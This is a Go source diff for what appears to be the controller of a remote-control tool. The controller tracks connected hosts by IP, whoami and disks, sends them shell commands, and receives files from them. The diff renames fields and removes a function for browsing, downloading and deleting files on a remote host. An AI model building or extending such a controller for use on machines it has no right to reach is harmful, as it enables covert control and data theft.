@@ -24,10 +24,10 @@ var MaxMagString = 5000     //默认每次接受命令的大小
 
 type HOSTS struct {
 	Ip        string
-	chans     chan string
+	Chans     chan string
 	Time      string
 	Living    string
-	chansBack chan string
+	ChansBack chan string
 	Whoami    string
 	Disk      []string
 	file      string
@@ -57,14 +57,14 @@ func (hosts *HOSTS) UseCmd() {
 			fmt.Printf("user cmd :%s\n", a)
 		}
 
-		hosts.chans <- "Cmd\r\n" + a
+		hosts.Chans <- "Cmd\r\n" + a
 		//b = <-hosts.chansBack
 		//fmt.Printf("\n%s", b)
 	}
 }
 func (hosts *HOSTS) SetCmd(string2 string) {
 	cmd := "Cmd\r\n" + string2
-	hosts.chans <- cmd
+	hosts.Chans <- cmd
 	//backs := <-hosts.chansBack
 	fmt.Printf("\n")
 	//fmt.Printf("%s", backs)
@@ -108,7 +108,7 @@ func PutMsgs(conn net.Conn, cmd int) {
 	}
 	for {
 		Sends := ""
-		Sends = <-IpChanMap[cmd].chans
+		Sends = <-IpChanMap[cmd].Chans
 		if DEBUG {
 			//fmt.Printf("PUT")
 		}
@@ -225,96 +225,6 @@ func (hosts HOSTS) PrintHost(i int) {
 		time.Now().Format("01-02 15:04:05"), hosts.Living)
 }
 
-func (hosts *HOSTS) FileDeal(id int) {
-	var (
-		relativePath string
-		abslsentPath = ""
-		Type         = ""
-		temp         = ""
-	)
-
-	reg := regexp.MustCompile("(.*/)")
-	hosts.chans <- "DocumentDocument\r\n"
-	if DEBUG {
-		fmt.Printf("DocumentDocument\r\n")
-	}
-	for _, j := range IpChanMap[id].Disk[1:] {
-		fmt.Printf("存在盘符%s\n", j)
-	}
-	//fmt.Printf("%s", <-hosts.chansBack)
-	if Computer == "windows" {
-		fmt.Scanf("%s", temp)
-	}
-	for {
-
-		fmt.Printf("%s>", abslsentPath)
-		_, err := fmt.Scanf("%s %s\n", &Type, &relativePath)
-		if err != nil && err.Error() != "unexpected newline" {
-			fmt.Printf("输入错误6\n")
-			log.Println(err)
-		}
-		if DEBUG {
-			fmt.Printf("Type : %s\nPath: %s\n"+
-				"", Type, relativePath)
-		}
-
-		switch Type {
-		case "dir":
-			if abslsentPath != "" {
-				hosts.chans <- "Documentdir " + abslsentPath
-			}
-		case "cd":
-			if relativePath == ".." {
-				if strings.Index(abslsentPath, "/") == -1 {
-					if DEBUG {
-						fmt.Printf("未找到/\n")
-					}
-					if DEBUG {
-						fmt.Printf("当前盘符容量：%d盘符len：%d\n", cap(IpChanMap[id].Disk), len(IpChanMap[id].Disk))
-					}
-					for _, j := range IpChanMap[id].Disk[1:] {
-						fmt.Printf("存在盘符%s\n", j)
-					}
-					abslsentPath = "" //默认没有/的时候就清空
-					continue
-				}
-				abslsentPath = reg.FindString(abslsentPath) //如果最后一个是“/”就需要去掉
-				if abslsentPath[len(abslsentPath)-1:] == "/" {
-					abslsentPath = abslsentPath[:len(abslsentPath)-1]
-				}
-
-			} else if abslsentPath == "" {
-				abslsentPath = relativePath
-			} else if relativePath == "" {
-				hosts.chans <- "DocumentDocument\r\n"
-				abslsentPath = ""
-				relativePath = ""
-				continue
-			} else {
-				abslsentPath = abslsentPath + "/" + relativePath
-			}
-			path := "Documentdir " + abslsentPath
-			if DEBUG {
-				fmt.Printf("path:%s\n", path)
-			}
-			hosts.chans <- path
-		case "get":
-			hosts.chans <- "Documentget " + abslsentPath + relativePath
-			hosts.chansBack <- relativePath
-		case "del":
-			hosts.chans <- "Documentdel " + abslsentPath + relativePath
-		case "quit":
-			hosts.chans <- "Documentquit"
-			return
-		default:
-			fmt.Printf("help\n")
-			//help
-		}
-		//time.Sleep(1000)
-	}
-
-}
-
 func GetMsg(conn net.Conn, hosts int) {
 	regstring := "\\ADocument\\r\\n"
 	regAlive := "\\AAlive\\r\\n"
@@ -374,7 +284,7 @@ func GetMsg(conn net.Conn, hosts int) {
 			file := b[10:n1]
 			//data, _ := ioutil.ReadAll(transform.NewReader(bytes.NewReader([]byte(file)), simplifiedchinese.GBK.NewEncoder()))
 
-			filename := <-IpChanMap[hosts].chansBack
+			filename := <-IpChanMap[hosts].ChansBack
 
 			if filename == "" {
 				filename = IpChanMap[hosts].file
@@ -442,8 +352,4 @@ func GetMsg(conn net.Conn, hosts int) {
 		}
 
 	}
-}
-
-func (hosts *HOSTS) Fileput() {
-	fmt.Printf("fileput")
 }
